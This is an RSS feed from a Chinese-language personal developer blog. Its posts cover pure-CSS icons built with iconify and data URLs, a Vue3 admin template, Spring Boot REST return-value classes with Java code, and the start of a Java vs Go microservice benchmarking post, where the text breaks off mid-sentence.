<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>The Elone Hoo Blog</title>
        <link>https://elonehoo.xyz</link>
        <description>The blog for the Elone Hoo</description>
        <lastBuildDate>Sun, 14 Aug 2022 14:32:16 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <image>
            <title>The Elone Hoo Blog</title>
            <url>/logo.svg</url>
            <link>https://elonehoo.xyz</link>
        </image>
        <copyright>Copyright (c) 2022-present, Elone Hoo</copyright>
        <item>
            <title><![CDATA[纯CSS图标方案]]></title>
            <link>https://elonehoo.xyz/posts/icons-in-pure-css.html</link>
            <guid>https://elonehoo.xyz/posts/icons-in-pure-css.html</guid>
            <pubDate>Sun, 14 Aug 2022 12:00:00 GMT</pubDate>
            <description><![CDATA[<blockquote>
<p>我想开启一个新坑，在编写实验🧪项目<a href="https://github.com/elonehoo/pick" target="_blank" rel="noopener noreferrer">pick</a> 时，设计了一个<a href="https://pick.elonehoo.xyz/components/icon.html" target="_blank" rel="noopener noreferrer">组件 pick-icon</a></p>
</blockquote>
<p>我认识到了一个很酷的<a href="https://github.com/iconify/iconify" target="_blank" rel="noopener noreferrer">仓库</a>，他提供了超过 100,000 个图标的 100 多个图标集，这是一个非常疯狂的实验项目，我想创建一个icon的组件，他基于 iconify 可以基于我们所安装的图标集，按需加载图标。</p>
]]></description>
            <content:encoded><![CDATA[<div><blockquote><p>我想开启一个新坑，在编写实验🧪项目<a href="https://github.com/elonehoo/pick" target="_blank" rel="noopener noreferrer">pick</a> 时，设计了一个<a href="https://pick.elonehoo.xyz/components/icon.html" target="_blank" rel="noopener noreferrer">组件 pick-icon</a></p></blockquote><p>我认识到了一个很酷的<a href="https://github.com/iconify/iconify" target="_blank" rel="noopener noreferrer">仓库</a>，他提供了超过 100,000 个图标的 100 多个图标集，这是一个非常疯狂的实验项目，我想创建一个icon的组件，他基于 iconify 可以基于我们所安装的图标集，按需加载图标。</p><hr><h2 id="现有的解决方案" tabindex="-1">现有的解决方案 <a class="header-anchor" href="#现有的解决方案" aria-hidden="true">#</a></h2><p>其实社区早已经有一个名为 <a href="https://github.com/astrit/css.gg" target="_blank" rel="noopener noreferrer">css.gg</a> 的纯css图标的解决方案。它完全通过伪元素（<code>::before</code>，<code>::after</code>）来构建图标。因为如果需要使用这个解决方案，那么就需要我们对于 CSS 的工作原理有一个十分深刻的理解，但是同时很难创造出一个更为复杂的图标(因为它只有3个元素可以供我们使用)。我的脑海里产生了一个非常酷炫的想法，我觉得可以应用在所有的图标上而并非只局限于在特定的集合中进行有限的选择。</p><h2 id="我的想法" tabindex="-1">我的想法 <a class="header-anchor" href="#我的想法" aria-hidden="true">#</a></h2><p>用 CSS 中的 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs" target="_blank" rel="noopener noreferrer">Data URLs</a> 中的文件模式作为背景图，并且产生一段 CSS:</p><div class="language-css"><pre><code><span class="token selector">.my-icon</span> <span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>data:...<span class="token punctuation">)</span></span> no-repeat center<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 1.2em<span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 1.2em<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>有了这种方案，我们就可以使用一个单独的类在 CSS 中内嵌任何图像。</p><h2 id="实现" tabindex="-1">实现 <a class="header-anchor" href="#实现" aria-hidden="true">#</a></h2><p>我们可以使用 <a href="https://github.com/iconify/iconify" target="_blank" rel="noopener noreferrer">iconify</a> 的utils包来实现我们的想法，初步设计为</p><div class="language-typescript"><pre><code><span class="token keyword">import</span> <span class="token punctuation">{</span> iconToSVG<span class="token punctuation">,</span> getIconData <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&#39;@iconify/utils&#39;</span>
<span class="token comment">// (假的，意思到了就可以了)</span>
<span class="token keyword">const</span> svg <span class="token operator">=</span> <span class="token function">iconToSVG</span><span class="token punctuation">(</span><span class="token function">getIconData</span><span class="token punctuation">(</span><span class="token string">&#39;mdi&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;alarm&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><p>当我们得到 SVG 字符串后，可以将其转换为 DataURLs：</p><div class="language-typescript"><pre><code><span class="token keyword">const</span> dataUri <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">data:image/svg+xml;base64,</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>svg<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">&#39;base64&#39;</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
</code></pre></div><p>这样的话，基本效果就实现了。</p><h2 id="后续" tabindex="-1">后续 <a class="header-anchor" href="#后续" aria-hidden="true">#</a></h2><p>还需要继续设计，不然肯定不能用。</p></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[构建属于自己的管理页面]]></title>
            <link>https://elonehoo.xyz/posts/vname-admin.html</link>
            <guid>https://elonehoo.xyz/posts/vname-admin.html</guid>
            <pubDate>Mon, 21 Mar 2022 12:00:00 GMT</pubDate>
            <description><![CDATA[<p>这是一个可能目前只属于我的 admin 模板，但是他有这比较快的样式表，是的你没有看错，就是一个比较快的样式表，因为它并没有使用其他的任何样式模板，例如 uncss 之类的，采用了 Vue3 and Vite and TypeScript 作为构建的方式进行搭建，目前虽然还处于早期阶段，这是一个非常大的项目，对于我个人而言。</p>
]]></description>
            <content:encoded><![CDATA[<div><p>这是一个可能目前只属于我的 admin 模板，但是他有这比较快的样式表，是的你没有看错，就是一个比较快的样式表，因为它并没有使用其他的任何样式模板，例如 uncss 之类的，采用了 Vue3 and Vite and TypeScript 作为构建的方式进行搭建，目前虽然还处于早期阶段，这是一个非常大的项目，对于我个人而言。</p><hr><p>Vname-admin 是一个使用原生Css3作为css引擎的样式管理项目。它并没有限制用户的一些个人癖好，例如如何使用 axios ，喜欢使用怎么样的 ui 库。但是有一个比较难以决定的地方就是应该使用 SFC 还是 TSX 这里我选择了 SFC，原因是 SFC 是一个可以让一个刚刚上手的程序员可以快速的对于 Vname 进行修改。</p><p>现在已经完成了 Login ， result ， error 页面。完善了 button 组件，头像组件。打算在快完成的时候，进行文档的编写。</p><p>希望大家可以尽情期待吧！</p></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Spring Boot - 构建 RESTful Web 服务]]></title>
            <link>https://elonehoo.xyz/posts/building-restful-web.html</link>
            <guid>https://elonehoo.xyz/posts/building-restful-web.html</guid>
            <pubDate>Sat, 26 Feb 2022 12:00:00 GMT</pubDate>
            <description><![CDATA[<p>浏览了大部分的教程，发现并没有任何一篇教程提到 <code>ResponseEntity</code> 作为返回值，都是使用了自己创建一个 <code>Result</code> 类，这样也可以算是成为了 Restful 的返回值了吗？</p>
<p>我发出了一个疑惑？那这样的还算是一个正常的返回值了吗？</p>
]]></description>
            <content:encoded><![CDATA[<div><p>浏览了大部分的教程，发现并没有任何一篇教程提到 <code>ResponseEntity</code> 作为返回值，都是使用了自己创建一个 <code>Result</code> 类，这样也可以算是成为了 Restful 的返回值了吗？</p><p>我发出了一个疑惑？那这样的还算是一个正常的返回值了吗？</p><hr><h2 id="绝大部分" tabindex="-1">绝大部分 <a class="header-anchor" href="#绝大部分" aria-hidden="true">#</a></h2><p>我随意的复制了一个点赞最高的<a href="https://blog.csdn.net/aiyaya_/article/details/78209992" target="_blank" rel="noopener noreferrer">博客</a></p><p>创建了一个 <code>Result</code> 和 <code>ResultCode</code> 类</p><p>代码如下</p><div class="language-java"><pre><code><span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Data</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Result</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>

	<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3948389268046368059L</span><span class="token punctuation">;</span>

	<span class="token keyword">private</span> <span class="token class-name">Integer</span> code<span class="token punctuation">;</span>

	<span class="token keyword">private</span> <span class="token class-name">String</span> msg<span class="token punctuation">;</span>

	<span class="token keyword">private</span> <span class="token class-name">Object</span> data<span class="token punctuation">;</span>

	<span class="token keyword">public</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> code<span class="token punctuation">,</span> <span class="token class-name">String</span> msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>
		<span class="token keyword">this</span><span class="token punctuation">.</span>msg <span class="token operator">=</span> msg<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Result</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token class-name">Result</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		result<span class="token punctuation">.</span><span class="token function">setResultCode</span><span class="token punctuation">(</span><span class="token class-name">ResultCode</span><span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> result<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Result</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token class-name">Object</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token class-name">Result</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		result<span class="token punctuation">.</span><span class="token function">setResultCode</span><span class="token punctuation">(</span><span class="token class-name">ResultCode</span><span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
		result<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> result<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Result</span> <span class="token function">failure</span><span class="token punctuation">(</span><span class="token class-name">ResultCode</span> resultCode<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token class-name">Result</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		result<span class="token punctuation">.</span><span class="token function">setResultCode</span><span class="token punctuation">(</span>resultCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> result<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Result</span> <span class="token function">failure</span><span class="token punctuation">(</span><span class="token class-name">ResultCode</span> resultCode<span class="token punctuation">,</span> <span class="token class-name">Object</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token class-name">Result</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		result<span class="token punctuation">.</span><span class="token function">setResultCode</span><span class="token punctuation">(</span>resultCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
		result<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> result<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setResultCode</span><span class="token punctuation">(</span><span class="token class-name">ResultCode</span> code<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">.</span><span class="token function">code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">this</span><span class="token punctuation">.</span>msg <span class="token operator">=</span> code<span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-java"><pre><code><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">ResultCode</span> <span class="token punctuation">{</span>

	<span class="token comment">/* 成功状态码 */</span>
	<span class="token function">SUCCESS</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&quot;成功&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

	<span class="token comment">/* 参数错误：10001-19999 */</span>
	<span class="token function">PARAM_IS_INVALID</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">,</span> <span class="token string">&quot;参数无效&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">PARAM_IS_BLANK</span><span class="token punctuation">(</span><span class="token number">10002</span><span class="token punctuation">,</span> <span class="token string">&quot;参数为空&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">PARAM_TYPE_BIND_ERROR</span><span class="token punctuation">(</span><span class="token number">10003</span><span class="token punctuation">,</span> <span class="token string">&quot;参数类型错误&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">PARAM_NOT_COMPLETE</span><span class="token punctuation">(</span><span class="token number">10004</span><span class="token punctuation">,</span> <span class="token string">&quot;参数缺失&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

	<span class="token comment">/* 用户错误：20001-29999*/</span>
	<span class="token function">USER_NOT_LOGGED_IN</span><span class="token punctuation">(</span><span class="token number">20001</span><span class="token punctuation">,</span> <span class="token string">&quot;用户未登录&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">USER_LOGIN_ERROR</span><span class="token punctuation">(</span><span class="token number">20002</span><span class="token punctuation">,</span> <span class="token string">&quot;账号不存在或密码错误&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">USER_ACCOUNT_FORBIDDEN</span><span class="token punctuation">(</span><span class="token number">20003</span><span class="token punctuation">,</span> <span class="token string">&quot;账号已被禁用&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">USER_NOT_EXIST</span><span class="token punctuation">(</span><span class="token number">20004</span><span class="token punctuation">,</span> <span class="token string">&quot;用户不存在&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">USER_HAS_EXISTED</span><span class="token punctuation">(</span><span class="token number">20005</span><span class="token punctuation">,</span> <span class="token string">&quot;用户已存在&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

	<span class="token comment">/* 业务错误：30001-39999 */</span>
	<span class="token function">SPECIFIED_QUESTIONED_USER_NOT_EXIST</span><span class="token punctuation">(</span><span class="token number">30001</span><span class="token punctuation">,</span> <span class="token string">&quot;某业务出现问题&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

	<span class="token comment">/* 系统错误：40001-49999 */</span>
	<span class="token function">SYSTEM_INNER_ERROR</span><span class="token punctuation">(</span><span class="token number">40001</span><span class="token punctuation">,</span> <span class="token string">&quot;系统繁忙，请稍后重试&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

	<span class="token comment">/* 数据错误：50001-599999 */</span>
	<span class="token function">RESULE_DATA_NONE</span><span class="token punctuation">(</span><span class="token number">50001</span><span class="token punctuation">,</span> <span class="token string">&quot;数据未找到&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">DATA_IS_WRONG</span><span class="token punctuation">(</span><span class="token number">50002</span><span class="token punctuation">,</span> <span class="token string">&quot;数据有误&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">DATA_ALREADY_EXISTED</span><span class="token punctuation">(</span><span class="token number">50003</span><span class="token punctuation">,</span> <span class="token string">&quot;数据已存在&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

	<span class="token comment">/* 接口错误：60001-69999 */</span>
	<span class="token function">INTERFACE_INNER_INVOKE_ERROR</span><span class="token punctuation">(</span><span class="token number">60001</span><span class="token punctuation">,</span> <span class="token string">&quot;内部系统接口调用异常&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">INTERFACE_OUTTER_INVOKE_ERROR</span><span class="token punctuation">(</span><span class="token number">60002</span><span class="token punctuation">,</span> <span class="token string">&quot;外部系统接口调用异常&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">INTERFACE_FORBID_VISIT</span><span class="token punctuation">(</span><span class="token number">60003</span><span class="token punctuation">,</span> <span class="token string">&quot;该接口禁止访问&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">INTERFACE_ADDRESS_INVALID</span><span class="token punctuation">(</span><span class="token number">60004</span><span class="token punctuation">,</span> <span class="token string">&quot;接口地址无效&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">INTERFACE_REQUEST_TIMEOUT</span><span class="token punctuation">(</span><span class="token number">60005</span><span class="token punctuation">,</span> <span class="token string">&quot;接口请求超时&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token function">INTERFACE_EXCEED_LOAD</span><span class="token punctuation">(</span><span class="token number">60006</span><span class="token punctuation">,</span> <span class="token string">&quot;接口负载过高&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

	<span class="token comment">/* 权限错误：70001-79999 */</span>
	<span class="token function">PERMISSION_NO_ACCESS</span><span class="token punctuation">(</span><span class="token number">70001</span><span class="token punctuation">,</span> <span class="token string">&quot;无访问权限&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">private</span> <span class="token class-name">Integer</span> code<span class="token punctuation">;</span>

	<span class="token keyword">private</span> <span class="token class-name">String</span> message<span class="token punctuation">;</span>

	<span class="token class-name">ResultCode</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> code<span class="token punctuation">,</span> <span class="token class-name">String</span> message<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>
		<span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> message<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">code</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>code<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>message<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">ResultCode</span> item <span class="token operator">:</span> <span class="token class-name">ResultCode</span><span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token keyword">return</span> item<span class="token punctuation">.</span>message<span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">return</span> name<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Integer</span> <span class="token function">getCode</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">ResultCode</span> item <span class="token operator">:</span> <span class="token class-name">ResultCode</span><span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token keyword">return</span> item<span class="token punctuation">.</span>code<span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token annotation punctuation">@Override</span>
	<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre></div><p>并且编写了一个简单的demo</p><div class="language-java"><pre><code><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">&quot;/demo2&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">demo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token class-name">Result</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	result<span class="token punctuation">.</span><span class="token function">setResultCode</span><span class="token punctuation">(</span><span class="token class-name">ResultCode</span><span class="token punctuation">.</span>DATA_IS_WRONG<span class="token punctuation">)</span><span class="token punctuation">;</span>
	result<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>我们来看一下浏览器的结果</p><p><img src="/assets/01.59916890.png" alt="01.png"></p><h2 id="使用-restful-return" tabindex="-1">使用 <code>restful-return</code> <a class="header-anchor" href="#使用-restful-return" aria-hidden="true">#</a></h2><div class="language-java"><pre><code><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">&quot;/demo&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">Result</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">internalServerError</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>结果如下</p><p><img src="/assets/02.0b222842.png" alt="02.png"></p><h2 id="结论" tabindex="-1">结论 <a class="header-anchor" href="#结论" aria-hidden="true">#</a></h2><p>高下立判。</p></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Java 的微服务能像 Go 一样快吗？]]></title>
            <link>https://elonehoo.xyz/posts/java_vs_go.html</link>
            <guid>https://elonehoo.xyz/posts/java_vs_go.html</guid>
            <pubDate>Thu, 24 Feb 2022 12:00:00 GMT</pubDate>
            <description><![CDATA[<p>Peter Nagy 在 2020 年 8 月的 Oracle Groundbreakers Tour 2020 LATAM 上发表了一篇题为“Go Java, Go!”的论文。看完后我问自己一个问题“Java 微服务能像 Go 一样快吗？” 我们创建了一些微服务并进行了一些基准测试，并在那次活动之后展示了我们的结果。但是还有更多需要探索，所以我们决定将我们的演示文稿变成这篇文章。</p>
]]></description>
            <content:encoded><![CDATA[<div><p>Peter Nagy 在 2020 年 8 月的 Oracle Groundbreakers Tour 2020 LATAM 上发表了一篇题为“Go Java, Go!”的论文。看完后我问自己一个问题“Java 微服务能像 Go 一样快吗？” 我们创建了一些微服务并进行了一些基准测试，并在那次活动之后展示了我们的结果。但是还有更多需要探索，所以我们决定将我们的演示文稿变成这篇文章。</p><hr><h2 id="前言" tabindex="-1">前言 <a class="header-anchor" href="#前言" aria-hidden="true">#</a></h2><p>我想试验一下，看看 Java 微服务是否可以像 Go 微服务一样快。行业普遍认为 Java 是“老”、“慢”和“无聊”；Go 是“快”、“新”和“酷”的。但我想知道这些特征是否得到实际性能数据的保证或支持。</p><p>我想要一个公平的测试，所以我创建了一个非常简单的微服务，没有外部依赖项（例如数据库），并且代码路径非常短（只是操作字符串）。我确实包含了指标和日志记录，因为这些似乎总是包含在任何真正的微服务中。我使用了小型轻量级框架（Java 的 Helidon 和 Go 的 Go-Kit），我还试验了 Java 的纯 JAX-RS。我尝试了不同版本的 Java 和不同的 JVM。我对堆大小和垃圾收集器进行了一些基本调整。我在测试运行之前预热了微服务。</p><h2 id="java-的一点历史" tabindex="-1">Java 的一点历史 <a class="header-anchor" href="#java-的一点历史" aria-hidden="true">#</a></h2><p>Java 由 Sun Microsystems 开发，后来被 Oracle 收购。它的 1.0 版本是在 1996 年，最新版本是 2021 年的 Java 17。主要设计目标是 Java 虚拟机和字节码的可移植性，以及带有垃圾收集的内存管理。它仍然是最流行的语言之一（根据 <a href="https://insights.stackoverflow.com/survey/2021#most-popular-technologies%E2%80%8B" target="_blank" rel="noopener noreferrer">StackOverflow</a> 和 <a href="https://www.tiobe.com/tiobe-index/" target="_blank" rel="noopener noreferrer">TIOBE</a> 等来源）,并且是<a href="https://openjdk.java.net/" target="_blank" rel="noopener noreferrer">开源</a>开发的。</p><p>接下来，让我们来聊一聊“Java 